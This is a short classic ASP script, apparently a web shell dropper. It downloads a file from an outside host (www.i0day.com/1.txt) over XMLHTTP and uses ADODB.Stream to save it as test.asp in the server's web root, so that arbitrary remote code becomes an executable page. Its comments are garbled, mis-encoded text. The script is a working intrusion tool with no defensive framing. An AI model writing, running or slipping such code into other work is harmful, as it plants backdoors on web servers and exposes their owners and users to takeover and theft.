<%

Set xPost = CreateObject("Microsoft.XMLHTTP")

xPost.Open "GET","http://www.i0day.com/1.txt",False //���������ϵĵ�ַ Ҳ���Ǵ���

xPost.Send()

Set sGet = CreateObject("ADODB.Stream")

sGet.Mode = 3

sGet.Type = 1

sGet.Open()

sGet.Write(xPost.responseBody)

sGet.SaveToFile Server.MapPath("test.asp"),2 //�ڸ�Ŀ¼���ɵ��ļ�

set sGet = nothing

set sPOST = nothing

response.Write("�����ļ��ɹ���")

%>